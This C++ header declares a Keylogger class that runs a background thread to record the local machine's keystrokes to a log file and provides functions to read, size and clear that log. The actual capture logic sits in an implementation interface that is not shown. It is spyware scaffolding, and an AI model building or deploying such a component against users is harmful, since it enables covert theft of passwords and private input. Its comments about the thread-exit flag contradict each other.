#pragma once

#include <string>
#include <vector>

#include "methods/keylogger/IKeyloggerImplementation.h"


namespace methods
{
namespace keylogger
{
/**
  * Class records keystrokes of the local machine.
  * It starts and stops a background thread and
  * saves keystrokes to a log file.
  *
  * Can only run 1 thread at a time.
  */
class Keylogger
{
public:
    Keylogger(IKeyloggerImplementation *implementation);
    virtual ~Keylogger();

    /**
      * Copy constructor steals m_implementation from copied object.
      */
    Keylogger(Keylogger& other);

    /**
      * This functions starts the logging thread.
      */
    void StartThread();

    /**
      * This functions stops the logging thread.
      */
    void StopThread();

    /**
      * This functions clears the log file.
      */
    void ClearLog();

    /**
      * Use this function to get the log file's size
      * in bytes.
      * @return size of log file in bytes
      */
    uint32_t LogSize();

    /**
      * Use this function to get the log file's content.
      * @param[in,out] buffer - a buffer to save the content to.
      * @param[in] buffer_len - the size of buffer.
      * @return number of bytes copied to buffer.
      */
    uint32_t GetLog(char *buffer,
                    uint32_t buffer_len);

protected:

    /**
      * Should thread be running at the moment.
      */
    bool m_threadRunning;

    /**
      * The thread marks its entering and exit using this
      * boolean. You know that a thread has finished its
      * process once this boolean is true.
      */
    bool m_threadOut;

private:

    IKeyloggerImplementation *m_implementation;

    /**
      * This function logs keystrokes while m_threadRunning
      * is true and is the described thread.
      * It sets m_threadOut true on entering,
      * and sets its value false on exit.
      */
    void KeylogThread();

};
}
}
